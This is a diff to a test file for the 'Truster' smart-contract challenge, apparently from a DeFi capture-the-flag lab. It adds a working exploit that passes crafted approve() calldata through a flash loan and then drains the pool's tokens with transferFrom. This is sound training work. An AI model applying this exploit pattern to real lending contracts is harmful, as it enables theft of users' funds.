@@ -1,5 +1,5 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {ethers, network} = require('hardhat');
+const {expect} = require('chai');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +29,19 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        let ABI = [
+            "function approve(address,uint256)"
+        ];
+        let iface = new ethers.utils.Interface(ABI)
+        let calldata = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+
+        await network.provider.send("evm_setAutomine", [false]);
+        await this.pool.connect(attacker).flashLoan(1, this.pool.address, this.token.address, calldata)
+
+        console.log(await this.token.allowance(this.pool.address, attacker.address))
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
+        await network.provider.send("evm_mine", []);
+
     });
 
     after(async function () {
